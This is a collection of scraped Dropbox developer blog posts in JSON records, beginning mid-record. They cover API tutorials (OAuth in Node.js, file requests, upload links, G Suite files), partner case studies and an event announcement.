browser with minimal code. While the example we’ve shown above is pretty basic , Chooser is a versatile component, with many other customization options. For example, you could preview the contents with a call to window.open() . Or , work with the content in your app using a direct link . Anywhere you might use a standard file upload in your app’s workflow , you can instead more nimbly access a user’s Dropbox files with the Chooser. If this blog post was interesting to you, you should also check out the Dropbox Saver . With the Saver implemented into your app, a user can add files of any size into their Dropbox instantly. For more Dropbox tutorials, check out our previous blog posts or our reference page . If you have any questions about Chooser or need help with anything else, you can always contact us here . Build with Dropbox today at www.dropbox.com/developers // Tags Developers Tips and Tricks JavaScript Components // Copy link Link copied Link copied", "date": "2019-05-31"},
{"website": "Dropbox", "title": "Google Docs, Sheets, and Slides with the Dropbox API", "author": ["Jenny Dong and April Wang"], "link": "https://dropbox.tech/developers/google-docs-sheets-and-slides-with-the-dropbox-api", "abstract": "Non-Downloadable Files Shared Links Update Testing Dropbox announced an integration with Google Cloud to enable users to create, open, and edit Google Docs, Sheets, and Slides files in Dropbox. Soon, using the Dropbox API, developers can integrate with G Suite content. New endpoints and extensions to existing endpoints will help Dropbox developers work with these files to serve shared users. This post outlines the changes and updates you should be aware of when handling Google Docs, Sheets, and Slides with the Dropbox API. Non-Downloadable Files G Suite files will be returned by files/list_folder , and can be moved, renamed, and deleted like other Dropbox files. Previews and thumbnails are supported as well. However, as online-only files, they are not directly downloadable . files/list_folder & files/get_metadata have been updated accordingly, and will return new metadata: Copy {\r\n    \"entries\": [\r\n        {\r\n            \".tag\": \"file\",\r\n            \"name\": \"Prime_Numbers.gsheet\",\r\n            \"id\": \"id:a4ayc_80_OEAAAAAAAAAXw\",\r\n            \"client_modified\": \"2015-05-12T15:50:38Z\",\r\n            \"server_modified\": \"2015-05-12T15:50:38Z\",\r\n            \"rev\": \"a1c10ce0dd78\",\r\n            \"size\": 7212,\r\n            \"path_lower\": \"/homework/math/prime_numbers.gsheet\",\r\n            \"path_display\": \"/Homework/math/Prime_Numbers.gsheet\",\r\n            \"is_downloadable\": false,\r\n            \"export_info\": {\r\n                \"exports_as\": \"xlsx\"\r\n            },\r\n            ...\r\n        }\r\n    ...\r\n} The new is_downloadable value will indicate if calling files/download is supported to return the binary file. Calling files/download and related endpoints will return an unsupported_file exception when is_downloadable is false . Non-downloadable files can instead be exported in the new files/export API call, to an appropriate filetype indicated in the file’s export_info . The new include_non_downloadable_files parameter on files/list_folder , which defaults to true , can be used to omit these types of files from list results. Shared Links Update To date, shared links have granted read-only access to content. Starting with G Suite, some types of Dropbox files may also allow someone with the link to edit as well.  We have enhanced our shared links API to support this. Shared links may have a link_access_level parameter, which defines read-only or editable. This new parameter may be returned by /sharing/list_shared_links and is settable by /sharing/ create_shared_link_with_settings . Copy {\r\n  ....\r\n  \"url\": \"https://www.dropbox.com/scl/fi/r0xdzphoh99eef2fazh8q/new%20gsheet.gsheet?dl=0&amp;rlkey=yil8l6grehzwi8tfkg5sbiqoe\",\r\n  \"id\": \"id:0uVLZNU2SdAAAAAAAAAQ7w\",\r\n  \"name\": \"new gsheet.gsheet\",\r\n  \"path_lower\": \"/new gsheet.gsheet\",\r\n  \"link_permissions\": {\r\n    \"link_access_level\": {\r\n      \".tag\": \"viewer\"\r\n    }\r\n    \"effective_audience\": {\r\n      \".tag\": \"public\"\r\n    }\r\n  }\r\n} If the link access level is unspecified , the access level will be viewer by default. With this enhancement, it will be possible for these types of files to have multiple links — one for views and one for edits. The view access level can be used in conjunction with the audience parameter , so you could create a public view only link and an editable link for the team. Please also note the following behaviors: G Suite links may not be returned by /sharing/list_shared_links if a path is not specified . The password and expiration settings are not currently supported for G Suite shared links and will return an invalid_settings error if set. These links will have an effective_audience parameter returned instead of resolve_visibility to indicate the effective visibility of the link. Eventually all links will transition to return effective_audience instead. H istorically , shared links have been unique to the link creator and content. Thus , the same piece of shared content may have multiple links created by different users. Starting with G Suite files , some types of shared links may be unique to the content only, so all users share the link to the content . Testing If you’re part of a Dropbox Business team, your admin can enable G Suite access in the Dropbox Admin Console so that you can test against the new document types in Dropbox. Please feel free to contact us here with any questions or feedback about using the Dropbox API to manage G Suite files in Dropbox. Build with Dropbox today at www.dropbox.com/developers // Tags Developers Announcements Cloud Docs Tips and Tricks // Copy link Link copied Link copied", "date": "2019-06-07"},
{"website": "Dropbox", "title": "OAuth code flow implementation using Node.JS and Dropbox JavaScript SDK", "author": ["Ruben Rincon"], "link": "https://dropbox.tech/developers/oauth-code-flow-implementation-using-node-js-and-dropbox-javascript-sdk", "abstract": "Configuring a Dropbox app Setting up your project OAuth code flow Where to go from here In this blog post we show you how to implement an OAuth authorization code grant flow using Node.JS and Dropbox JavaScript SDK that works with multiple users. The code presented here is for a development environment, as you need to carefully implement security measures not considered in this blog post when using a production environment. We will walk you through the configuration of a Dropbox application, installing and configuring the libraries needed for the project, and finally the code implementation that supports the OAuth authorization code grant flow using JavaScript. If you are unfamiliar with OAuth, we recommend you to read first the Dropbox OAuth guide. Configuring a Dropbox app You'll need to have a Dropbox account to access the APIs. If you don't already have one, you can sign up for a free account here . Then go to the Dropbox App Console and click \" Create App\". Choose Dropbox API, App Folder access type, enter a unique name and click on \"Create app\". For more information about the App console and access type, visit our Getting Started guide. Creating a Dropbox app in the App Console Now enable additional users in this app. In the settings page of your app you will find a button to do this. This step is important if you want users different to the owner of the app to be authorized. Apply for production from your App Settings page Pre-register a redirect URI in the Dropbox admin console. For dev purposes, you can use localhost which is the only permitted http URI. So enter http://localhost:3000/auth and press the \"Add\" button. Whitelist localhost as a redirect URI on your App Settings page Setting up your project To install Node.JS, go to Nodejs.org and get the latest version. For this project, we need support for EcmaScript7 (ES7) so any version above 8.2.1 will work. After Node.JS is installed in your local dev environment, create a project structure using Express generator. We will use Handlebars as the template engine which leverages actual HTML. For more information about Express, visit their website . We also offer a short explanation about an Express project structure in this tutorial . First install express generator running: Copy npm install express-generator -g Now create a project called \"dbxoauth\" using the handlebars template engine. Run the following command: Copy express --hbs dbxoauth Then, navigate to the folder created and install dependencies: Copy cd dbxoauth\r\nnpm install We will be using the following node libraries: dotenv : to avoid hardcoding sensitive data such as keys and secrets express-session: to enable Web sessions used to store OAuth tokens and avoid the need to authenticate each time, as well as adding support to multiple users dropbox: Dropbox JavaScript SDK isomorphic-fetch: library required by Dropbox JavaScript SDK crypto: to generate random strings node-cache: to store data in local cache Run the following command to install the libraries above: Copy npm install dotenv express-session dropbox isomorphic-fetch crypto node-cache --save It is important not to hardcode any sensitive information. What you can do is create an .env file where you place sensitive data and make sure that file is never uploaded to a remote repository independently of the version control system you use. If you are using git, then you will add the .env to the .gitignore file. The dotenv library will read values from the .env file and add them to the current process. You can access these values via process.env.<variable_name> To load the values in the .env file, add this code as the first line of your app.js file: Copy require('dotenv').config({silent: true}); And create a .env file at the project root level with the following content: Copy DBX_APP_KEY=<your_app_key_from_developer_console>\r\nDBX_APP_SECRET=<your_app_secret_from_developer_console>\r\nSESSION_ID_SECRET=<create_your_own_secret> Web sessions will provide a mechanism to store access tokens and avoid the need to authenticate each time, additionally are a key element to handle multiple users. Let’s configure the middleware that enables Web sessions. For this, we use the express-session library. Whenever a browser makes a request to the server, a session for that user is retrieved and a cookie on the client will hold a reference to that session. In the app.js file, right after the app variable is assigned ( var app = express(); ) add the following code: Copy //session configuration\r\nconst session = require('express-session');\r\n \r\nlet session_options = {\r\n  secret: process.env.SESSION_ID_SECRET,\r\n  resave: false,\r\n  saveUninitialized: false,\r\n  cookie: { secure: false } //only for dev purpose\r\n}\r\napp.use(session(session_options)); This is minimal initialization that sets a cookie when the browser first hits the server and allows to use non-secure http connections for development purposes only. Notice that session data is not saved in the cookie itself, just the encrypted session ID . Session data is stored server-side. The SESSION_ID_SECRET is used to sign the session ID cookie. Note: If you plan to move to a production environment you need to take special attention to this configuration. You can learn more about this library in their GitHub repository. It also uses by default MemoryStore that according to their site “Is purposely not designed for a production environment. It will leak memory under most conditions, does not scale past a single process, and is meant for debugging and developing”. Additionally, whenever you stop the server, the MemoryStore is cleared out. You may consider using Redis as we explain in this other tutorial . OAuth code flow We will implement an OAuth authorization code grant flow with the below following sequence. Diagram of Dropbox's authorization code (3-legged) OAuth flow When a request is received in the home route / , we check if the session for that user has already a token stored in it, if that is the case, we can use the token directly to get resources from Dropbox, if not, then we need to get a token. To do that, we generate a random state using the crypto library and the node-cache library to save in cache for a few minutes with the state as key and the session id as value. Then we use the Dropbox JavaScript SDK to obtain the authorization URL and redirect the user to that address. This will handle multiple users as each user will have a different state and session id. If the user takes too long to validate credentials and authorize the app with Dropbox, the cache will expire, adding an extra layer of security. After completing authentication and authorization with Dropbox, the user will be sent back to the redirect URL along with the state string we sent and a code .  We validate the state checking that there was a session id for it and use the Dropbox JavaScript SDK to exchange the code for a token . Finally, the token received will be saved within the current session so next time the user reaches the home page / , they will be able to use Dropbox resources as long as their token is still valid, bypassing the need for authorization. To implement this flow, we need to add two routes to /routes/index.js . You can simply replace the whole file with the following code: Copy // /routes/index.js\r\nvar express = require('express');\r\nvar router = express.Router();\r\nconst controller = require('../controller');\r\n \r\nrouter.get('/', controller.home); //home route\r\nrouter.get('/auth', controller.auth); //redirect route\r\n \r\nmodule.exports = router; Now add the controller. Create a controller.js at the project root level with the following code: Copy const crypto = require('crypto');\r\nconst NodeCache = require( \"node-cache\" );\r\nconst Dropbox = require('dropbox').Dropbox;\r\nconst fetch = require('isomorphic-fetch');\r\n\r\n//Redirect URL to pass to Dropbox. Has to be whitelisted in Dropbox settings\r\nconst OAUTH_REDIRECT_URL='http://localhost:3000/auth';\r\n\r\n// Dropbox configuration\r\nconst config = {\r\n  fetch: fetch,\r\n  clientId: process.env.DBX_APP_KEY,\r\n  clientSecret: process.env.DBX_APP_SECRET\r\n};\r\n\r\nvar dbx = new Dropbox(config);\r\nvar mycache = new NodeCache();\r\n\r\nmodule.exports.home =  async (req, res, next)=>{\r\n  if(!req.session.token){\r\n    //create a random state value\r\n    let state = crypto.randomBytes(16).toString('hex');\r\n    // Save state and the session id for 10 mins\r\n    mycache.set(state, req.session.id, 6000);\r\n    // get authentication URL and redirect\r\n    authUrl = dbx.getAuthenticationUrl(OAUTH_REDIRECT_URL, state, 'code');\r\n    res.redirect(authUrl);\r\n  } else {\r\n    // if a token exists, it can be used to access Dropbox resources\r\n    dbx.setAccessToken(req.session.token);\r\n    try{\r\n      let account_details = await dbx.usersGetCurrentAccount();\r\n      let display_name = account_details.name.display_name;\r\n      dbx.setAccessToken(null); //clean up token\r\n\r\n      res.render('index', { name: display_name});\r\n    } catch(error){\r\n      dbx.setAccessToken(null);\r\n      next(error);\r\n    }\r\n  }\r\n}\r\n\r\n// Redirect from Dropbox\r\nmodule.exports.auth = async(req, res, next)=>{\r\n\r\n  if(req.query.error_description){\r\n    return next( new Error(req.query.error_description));\r\n  } \r\n\r\n  let state= req.query.state;\r\n  if(!mycache.get(state)){\r\n    return next(new Error(\"session expired or invalid state\"));\r\n  } \r\n\r\n  if(req.query.code){\r\n    try{\r\n      let token =  await dbx.getAccessTokenFromCode(OAUTH_REDIRECT_URL, req.query.code);\r\n      // store token and invalidate state\r\n      req.session.token = token;\r\n      mycache.del(state);\r\n      res.redirect('/');\r\n    }catch(error){\r\n         return next(error);\r\n    }\r\n  }\r\n} Finally, modify the home page to display the information retrieved from Dropbox. When a user successfully authenticates and has a valid token, we get the display_name using the Dropbox JavaScript SDK and show it on the page. Replace the /views/index.hbs with this code: Copy <!-- /views/index.hbs -->\r\n<h1>Logged in!</h1>\r\n<p>Hello {{name}}</p> You can now start the server locally on your machine Copy npm start And go to http://localhost:3000 in your browser. You will go through the authentication, authorization flow and finally to a page that shows your name retrieved from Dropbox. Images of each screen your users will see during an authorization code (3-legged) OAuth flow 🎉 Congratulations! You have successfully implemented an OAuth authorization code grant flow. Where to go from here W e recommend checking out the Dropbox OAuth guide for more information on OAuth. If you’re interested in more Dropbox tutorials, check out our previous blog posts, which contain guides to: Writing a script for a simple expense organizer app Writing a photo gallery Web Service from scratch with Node.JS and Dropbox with production deployment on Heroku Photo gallery tutorial with tags using the File Properties API Have ideas for other guides you would like to see? Let us know by posting in the Dropbox Developer Community forums . If you have any questions about this or need help with anything else, you can always contact us here . Build with Dropbox today at www.dropbox.com/developers // Tags Developers Node.js JavaScript Sample Apps Tips and Tricks Oauth // Copy link Link copied Link copied", "date": "2019-03-13"},
{"website": "Dropbox", "title": "Streamline file collection with the file request API", "author": ["Jj121217"], "link": "https://dropbox.tech/developers/streamline-file-collection-with-the-file-request-api", "abstract": "How file requests work Automate file requests Retrieve your requested files Build Dropbox into your workflow It’s the first of the month and that means you’re about to be inundated with invoices from contractors. You could head it off with a bulk email, but then you’re wading through replies with attachments that could easily be lost in the shuffle of other activity. This is a perfect use case for Dropbox and our API to help automate tasks like file collection. File r equests help you structure these repeating duties. Whether it’s contractor invoices, student homework assignments, or new employee headshots, you can use file requests to collect and organize files from anyone, right in your Dropbox account. How file requests work You can create file requests from the user interface or via the API. Before we show the automated method, it’s useful to see how it works manually. You can create a file request from the file requests page while logged into your Dropbox account. When creating a request, you can select the location in your Dropbox where the files should be saved as well as set collection deadlines. These requests can be sent to anyone, whether they have a Dropbox account or not, and are great for collecting large files. To learn more about the process of manually creating Dropbox file requests, check out our help center article or business guide . If you’re interested in the experience of the user you’re sending the request to, this help center article covers how to upload a file once you’ve been sent a file request. Automate file requests Creating file requests manually from the Dropbox UI is a quick and simple process, but can be repetitive when performed often. The Dropbox API helps streamline these sorts of tasks, big and small. Let’s see what it takes to create a file request via the API. We’ll use the Python SDK , but you can implement this in any Dropbox SDK or directly via HTTP calls . To start, you’ll want to install Dropbox for Python . To create a file request in Python requires only a few lines of code: Copy import dropbox\r\n \r\ndbx = dropbox.Dropbox('YOUR_ACCESS_TOKEN')\r\nreq = dbx.file_requests_create(title=\"August invoices\", destination=\"/File requests/August\")\r\nprint req.url\r\nprint req.id You’ll want to include your access token, and change the title and destination. See our OAuth guide for more information on how to get an access token and build OAuth into your app. Assuming your access token can use your entire Dropbox account, the destination can be any path, even if the folders don’t exist. It’s relative to your Dropbox account or folder, and should start with a slash. Since you’ll be creating many of these, it’s a good idea to create a folder to hold all of your file requests. The code above prints out the request URL, which you can copy and paste to any destination. You’ll want to fully automate your file requests so you can send them monthly, weekly, or any cadence you need. You can include the URL in an automated email message, or a call to the Slack API (or other chat app). The code also prints the request ID, which you will use to retrieve requested files in the next step. Take a look at the documentation for dropbox.file_requests.FileRequest to find out what other properties are available to print. Finally, you’ll want a way to run your script whenever it’s needed. You can use a cron job or a scheduled event service. Now that you’ve created file requests, you want to also see their status. Retrieve your requested files Once you’ve sent your file request to contractors, students, or others, you can wait for the files to come in. They’ll come to your Dropbox folder, just as they did in the manual example. If you get desktop notifications, you’ll know whenever someone uploads on your file request page. There are a couple ways to use the Dropbox API to check in on your file requests. You can retrieve a current count of files uploaded to a request with a few more lines of Python: Copy import dropbox\r\n \r\ndbx = dropbox.Dropbox('YOUR_ACCESS_TOKEN')\r\nreq = dbx.file_requests_get(\"YOUR_REQUEST_ID\")\r\nprint req.file_count Again, you’ll need to include your access token . You’ll also need to know the ID of your file request from the prior step. Among the data you get back is the number of files that have been uploaded. The code above prints out the current file_count field . Because file requests use a normal Dropbox folder, you can list the files using the primary Dropbox API. Here’s how I’d print a list of filenames for my August invoice example: Copy import dropbox\r\n \r\ndbx = dropbox.Dropbox('YOUR_ACCESS_TOKEN')\r\nreq = dbx.files_list_folder(\"/File requests/August\")\r\nfor f in req.entries:\r\n  print f.path_display This approach will work up to 2,000 files, which covers most file request use cases. Keep in mind, multiple file requests can use the same folder, which could impact what files end up in this folder. Additionally, anyone with access to the folder could add files outside of the file request system. Build Dropbox into your workflow If Dropbox is already a part of your workflow, use the file requests API to simplify and organize how you collect files. If you’re interested in more Dropbox tutorials, check out our previous blog posts, which contain guides to: Writing a script for a simple expense organizer app Writing a photo gallery Web Service from scratch with Node.JS and Dropbox with production deployment on Heroku Photo gallery tutorial with tags using the File Properties API OAuth code flow implementation using Node.JS and Dropbox JavaScript SDK Have ideas for other posts you would like to see? Let us know by posting in the Dropbox Developer Community forums . If you have any questions about this post or need help building with the Dropbox API, you can always contact us here . Build with Dropbox today at www.dropbox.com/developers // Tags Developers Python Files Sample Apps Tips and Tricks File Requests // Copy link Link copied Link copied", "date": "2019-04-23"},
{"website": "Dropbox", "title": "New file upload link API", "author": ["Kyle Anderson"], "link": "https://dropbox.tech/developers/new-file-upload-link-api", "abstract": "Use Case for Temporary Upload Link Example: Get Temporary Link Using DBX Python SDK The /get_temporary_upload_link API endpoint is now officially out of preview and available for production use. Developers can use this API call to get pre-signed upload URLs. Use Case for Temporary Upload Link One of the most common actions a Dropbox integration will perform is to add new content. The / upload endpoint is used to push binary content to Dropbox. This is perfect for apps where the file is local to the machine connecting to Dropbox. However, for some types of client-server applications that integrate with Dropbox, this may be not optimal. For example, you may have a server-based application which manages all state and interaction with Dropbox and a mobile client that connects your server. In this scenario, uploading a new file to Dropbox via your app’s client with the upload endpoint would mean: Your client uploads the file to a temporary location on your server Your server uploads the file to Dropbox via the API Enter pre-signed upload URLs. Using the /get_temporary_upload_link endpoint allows you to create a temporary, one-time use URL that can be sent to your client to upload a file. In this model: Your client asks your server for an upload URL Your server issues a call to Dropbox to get a URL, and returns that URL to your client The client posts the file to Dropbox directly to the returned URL This method saves your server the storage, network traffic, and complexity of forwarding this content. It’s significantly faster end to end, while still allowing for OAuth credentials to be stored and secured centrally in your server infrastructure. Example: Get Temporary Link Using DBX Python SDK Here’s a python code snippet of how a server and client would use this URL. Server Copy import dropbox\r\nfrom dropbox.files import CommitInfo, WriteMode\r\n# Receive a request from the client to get an upload URL\r\n \r\ndbx = dropbox.Dropbox()\r\ncommit_info = CommitInfo(path=, mode=WriteMode.overwrite)\r\ntemp_link = dbx.files_get_temporary_upload_link(commit_info=commit_info)\r\nprint(temp_link.link)\r\n \r\n# send upload url to client Client Copy import requests\r\n \r\n# Request an upload url from the server\r\n \r\ndata = open('', 'rb').read()\r\nres = requests.post(url='', data=data, headers={'Content-Type': 'application/octet-stream'})\r\nif (res.status_code == 200):\r\n    print(\"Success. Content hash: \"+res.json()['content-hash'])\r\nelif (res.status_code == 409):\r\n    print(\"Conflict. The link does not exist or is currently unavailable, the upload failed, or another error happened.\")\r\nelif (res.status_code == 410):\r\n    print(\"Gone. The link is expired or already consumed.\")\r\nelse:\r\n    print(\"Other error\") If you have any questions about this or need help with anything else, you can always contact us here. Build with Dropbox today at   www.dropbox.com/developers // Tags Developers Announcements Python Sharing Files Tips and Tricks // Copy link Link copied Link copied", "date": "2019-01-31"},
{"website": "Dropbox", "title": "Automate your development workflows with Dropbox and Workato", "author": ["Jj121217"], "link": "https://dropbox.tech/developers/automate-your-development-workflows-with-dropbox-and-workato", "abstract": "Streamlining case and bug management Intelligent approval workflows via Slack Automatically grant access to folders Dropbox is all about enabling teams to easily collaborate around content. There are many use cases for integrating directly with the Dropbox API , but there are also some scenarios where integrating with a workflow automation platform will allow you to ship a great solution faster than building them yourself. Whether you’re building out workflows for your company, customers, or yourself, Workato uses the Dropbox API to help you automate processes around content in Dropbox and other applications. Workato can poll for Dropbox events or receive events using webhooks . These events are then processed using the business logic defined in a Workato recipe to execute any number of tasks across one or more endpoints. For example, Workato can listen for a new CSV file added to a Dropbox folder and then upload the information from the file to a database, like Redshift; or when attachments are added to a Jira issue, Workato can automatically create a dedicated Dropbox folder, move the attachments to the folder, and add a Dropbox shared link to the Jira issue. Apart from real-time automations, you can also perform batch operations—like bulk uploading files from Dropbox to Amazon S3 at specified intervals. Workato offers an out-of-the-box Dropbox connector to handle all your integrations and workflow automations involving Dropbox. You can clone and tweak over 225K publicly available recipes to build your own custom workflow. Here are a few of the most popular Dropbox automations among developers to help you with your team's workflows: Streamlining case and bug management Workflow involving bug tracking, Zendesk, and Dropbox Most developers use an app stack to report, track, and resolve technical issues. For example, customers may upload supporting documentation—like screenshots of the bug—to an app like Dropbox, but your dev team likely works with a ticketing app like Zendesk and a project management app like Jira or Github . This means there’s often a disconnect between what the end user reports and what you’re working on. It also means resolution takes longer, because you have to switch between apps. Instead of manually reviewing and appending this documentation, you can automate the process with Workato. When a customer submits a ticket in Zendesk with accompanying screenshots, Workato can create an initial issue in Jira or GitHub based on the ticket’s priority. Workato can also upload the screenshot to a new Dropbox folder for storage. As changes are made to the ticket in Jira–and as any screenshots of the solution are uploaded to Dropbox–Workato can sync them to the right Zendesk ticket. Intelligent approval workflows via Slack Workbot is a bot to provide secure approval workflows via Slack Documents, such as UI/product designs and architecture documents, typically need to be approved before they can be implemented. When a member of your development team or a designer uploads a document/design to a folder marked “for approval,” Workato will pick up the new document and send a Slack message to the approver via Workbot , an enterprise platform bot for secure approval workflows in Slack. The approver can simply click a button in Slack to approve or not. If the document is approved, Workato will move the document to a different folder in Dropbox, perhaps one called “final design.” If the document is not approved, Workato will move the document to a different folder for revisions. Workato will also send a Slack notification to the person who uploaded the document seeking approval with the status update. Automatically grant access to folders When new developers join your team, you want to make sure they have access to all the appropriate resources. This often includes Dropbox folders where you store documentation, product screenshots, and other content. It’s easy to automate the processes of granting access to these folders with Workato. As soon as a new developer is marked as an active employee in your company’s HR app, like Namely , Workato can provision a new Dropbox account for them with the correct level of access. Similarly, when a developer changes groups or leaves the company, access rights can be automatically changed. Workato allows tools like Namely to easily connect with Dropbox By leveraging Workato’s out-of-the-box connectors for Dropbox , you can integrate Dropbox with other applications, like Jira, Slack, and GitHub, to automate workflows across Dropbox and all your other apps! Learn more about Workato’s integrations and automations for Dropbox here. Build with Dropbox today at www.dropbox.com/developers // Tags Developers Workflow Partners Automation Developer Spotlight // Copy link Link copied Link copied", "date": "2018-12-21"},
{"website": "Dropbox", "title": "How Dow Jones automated their GDPR compliance process with the Dropbox APIs", "author": ["Jj121217"], "link": "https://dropbox.tech/developers/how-dow-jones-automated-their-gdpr-compliance-process-with-the-dropbox-apis", "abstract": "The Challenge The Solution The Results Dow Jones needed to assess over 230 applications for GDPR compliance. Learn how they automated their internal process to collect, synthesize, search and access the data using the Dropbox APIs. The Challenge When the EU approved GDPR—the General Data Protection Regulation—in April of 2016, companies around the world took notice. The new set of laws, scheduled to take effect two years later, included strict standards for companies with access to personal data. With customers and employees across the globe, Dow Jones was no exception. The company’s GDPR team began work to evaluate data management, retention, and information flow policies across the company. As part of that effort, the team needed to assess any applications that processed personal data. Alex Zhang is the software engineer who was tasked with making that process as efficient as possible. His team, which is part of the IT organization, administers and customizes the company’s SSO, HR and collaboration tools. Alex’s role on the team is to make “glue,” which is his word for the code he writes to make all those different systems talk to each other. In this case, his goal was to facilitate the collection of survey data on each of the company’s applications, synthesize that data and provide a simple way for the GDPR team to search and access it. The Solution He started by using a CMDB system to aggregate the company’s more than 230 applications and map them to their owners and users. At the same time, he developed an internal survey tool to share custom surveys—over 650 in total—with those employees for completion. Next, he needed to create a way for Dow Jones’ GDPR team to easily access the survey data. His solution was to develop an ASP.net web form the GDPR team could use to request survey results for specific applications or users as needed. Each request triggered a custom application to query the survey database and generate a PDF report summarizing the results needed. Finally, he needed a simple way to share the PDF reports with the GDPR team, which is where he turned to Dropbox. With the Dropbox APIs, Zhang’s solution created a Dropbox folder using the /create_folder endpoint, saved the PDF there using the /upload endpoint, and generated a shared link to the folder using the API’s shared link creation endpoint, /create_shared_link_with_ settings . Just minutes after submitting the request, the GDPR team then received a link in an e-mail, allowing them to go to Dropbox and download the requested report. A request for a report on total survey results would be ready in 10 minutes. Visual of the Dow Jones GDPR workflow, including the specific Dropbox API endpoints used The Results The speed and accuracy of Zhang’s solution was critical to Dow Jones’ GDPR compliance effort. The integration between the ASP.net portal and Dropbox produced a seamless end user experience for the GDPR team. “Everyone at Dow Jones has a Dropbox Business account and knows how to use it,” says Zhang. “Taking advantage of that helped us get the technical hurdles out of the way and give people fast, direct access to the data they needed.” Automation was key to reducing the administrative overhead for everyone involved. “Automating the process allowed us to remove the human element,” says Zhang. “The less people have to get involved in managing data, the cleaner that data will be and the more time they’ll spend focusing on what they do best.” Zhang raves about the Dropbox API’s ease of use. “Some APIs make developers jump through hoops,” Zhang said. “But Dropbox’s is simple and well documented and overall a pleasure to work with.” “Some APIs make developers jump through hoops, but Dropbox’s is simple and well documented and overall a pleasure to work with.” He expects the value of his system to extend beyond GDPR. He is evaluating its fit for other use cases and, for example, is already using it to manage the company’s Code of Conduct survey. “Dropbox offers a unique solution to something that was antiquated for decades,” explains Zhang. “It brings social functionality to storage through sharing, availability and collaboration. That’s a really powerful combination.” If you’re interested in having your story featured on the Dropbox developer blog, let us know . To build your first Dropbox app, check out our getting started guide . // Tags Developers Sharing Files Partners Automation Developer Spotlight // Copy link Link copied Link copied", "date": "2018-11-19"},
{"website": "Dropbox", "title": "How FlowVella built Dropbox into their presentation platform", "author": ["Brent Brookler"], "link": "https://dropbox.tech/developers/how-flowvella-built-dropbox-into-their-presentation-platform", "abstract": "Genesis of FlowVella Integrating with Dropbox Reflections on the Dropbox API FlowVella is an interactive platform for building and viewing presentations on mobile. We met the CEO of FlowVella, Brent Brookler, at a Dropbox Developer Meetup in Seattle and were excited to learn about their integration with Dropbox. We asked Brent to write a guest post on our developer blog sharing why and how FlowVella integrated with Dropbox on their road to change the presentation landscape. Scroll on to read Brent's contribution. Genesis of FlowVella I started building software over 20 years years ago, and have been fortunate to work on projects with massive brands in content creation and marketing . In my previous company, we powered the American Idol text voting and built the first mobile game version of Family Feud. In my next company, we worked with CBS News and built the mobile versions of 60 Minutes, CBS News, CNET and other CBS News properties. After building dozens of content driven apps, I realized that the existing ‘presentation software’ hadn’t evolved for the mobile age . We set out to create a new way to share ideas and product s in a mobile and touch first way. FlowVella is a cloud-based interactive presentation platform for creating, publishing, sharing, and viewing presentations. Users can integrate various content types into one cohesive experience as FlowVella allows embedding of text, images, PDFs, video and gallery objects in easy linkable screens, defining modern interactive presentations. When viewing a presentation on Flowvella, the audience can take different paths to play video s , progress through slides, or open a PDF based on the way the conversation and interest flows. Our customers range from small businesses to larger enterprises mostly in manufacturing, home services, and real estate . With the launch of our kiosk app , Flow Kiosk , in August 2018 we’ re seeing a wide r range of use cases for trade shows, event booths, retail stores, and museum exhibits. Because FlowVella presentations work without an Internet connection via our iPad/iPhone app, a Mac app, and website, they are ideal for in person sales presentations and as an interactive kiosk. Integrating with Dropbox FlowVella and Flow Kiosk users embed text, images, PDFs, video, sounds, GIFs, and gallery objects into the ir interactive presentations, and m any users asked us specifically for t he ability to add content directly from their Dropbox folders. It was a no brainer to integrate with Dropbox as our first external data source–o ur customers are Dropbox customers and building the integration was relatively painless. While the Dropbox Chooser application makes for an easily embedded Dropbox interface to select and upload files into your application, we have our own UI for choosing content and wanted to keep users in the same experience when adding content from any external cloud source . FlowVella is a native iOS app, written in Objective - C , so we use d the Dropbox Objective-C SDK to browse and download Dropbox content into FlowVella presentations. We use the listFolder and listFolderContinue call s to populate the top level Dropbox f olders and files . We also use the getThumbnailData call to populate the lists with proper thumbnails as many of the files our users are selecting are visual . We use DBFILESMetadata to determine the file type (e.g. .jpeg, .mov) for each piece of content and check if it’s compatible with the specific container format (e.g. image, video) that the user is adding it to within FlowVella . W hen a user chooses the content they want to add to FlowVella, we use the downloadData method to pull from Dropbox . The content is then add ed to the FlowVella canvas. Choosing the source of the content ​​Top level folders of Dropbox shown in FlowVella UI Thumbnails populated with content from Dropbox Reflections on the Dropbox API The Dropbox API Framework and DBX Platform are easy to use , and the documentation was straightforward and helpful in our original launch. Additionally, b ecause the community of developers building on the platform is so large, finding help and examples is always really easy. It took about a week to build and integrate the Dropbox API into our own ‘content selection’ system. We tested extensively, on several devices and every content type to ensure that the whole process worked. And, when it came time to launch our new app this fall, it was extremely easy to add Flow Kiosk and build out that integration. Today, Dropbox is one of our most popular integrations and is integral for our users ’ workflows. FlowVella isn’t done integrating with Dropbox and we’re excited to see where we can expand support for our users next . We hope you enjoyed this guest blog contribution from Brent Brookler at FlowVella and that it gave you some ideas of how you can build or enhance your own Dropbox integration. To learn more about FlowVella and to see the Dropbox integration in action, head to flowvella.com . You can also contact Brent and the FlowVella team directly at info @flowvella.com . This was the first of many developer stories to tell. If you’re interested in having your app featured on the Dropbox developer blog, let us know . Build with Dropbox today at www.dropbox.com/developers // Tags Developers ObjectiveC Partners Components Developer Spotlight // Copy link Link copied Link copied", "date": "2018-11-29"},
{"website": "Dropbox", "title": "Announcing Tokyo and Sydney DBX Dev Tour", "author": ["Jj121217"], "link": "https://dropbox.tech/developers/announcing-tokyo-and-sydney-dbx-dev-tour", "abstract": "We’re excited to announce the next round of DBX Dev Days this month! The first stop is Sydney , where we’ll host a day for Dropbox developers in our beautiful office on Wednesday, October 17 . Then, we’re headed to Tokyo on Tuesday, October 23. Whether you’re building an app or optimizing internal workflows at your company, our goal is to have you walk away both inspired and equipped with the tools you need to build with Dropbox. Here is just some of what we have planned at each event. Presentations by the Dropbox team on everything from the vision and roadmap of the DBX Platform to how to use the Dropbox Business APIs A hands-on getting started workshop for developers who aren’t familiar with the Dropbox APIs to build their first app Deep dive discussions with developers from businesses like Atlassian , Canva, Nintex , and Dow Jones about their integrations with Dropbox Q&A and office hours where you can get hands on help building your integration, or learn about joint marketing and partnership opportunities To learn more about the DBX Dev Day in each city and to sign up to attend, head to the event pages linked below. Sydney — Wednesday, October 17 Tokyo — Tuesday, October 23 Photo of the Dropbox Sydney office Sydney and Tokyo have been at the top of our list to visit due to the strong developer presence across our local partners and customers, and we’re really looking forward to connecting in person with the community! To keep up to date with where we will be going next and all the latest Dropbox Developer news, follow us on Twitter . // Tags Developers Workshop Dbx Dev Day Developer Community // Copy link Link copied Link copied", "date": "2018-10-04"},
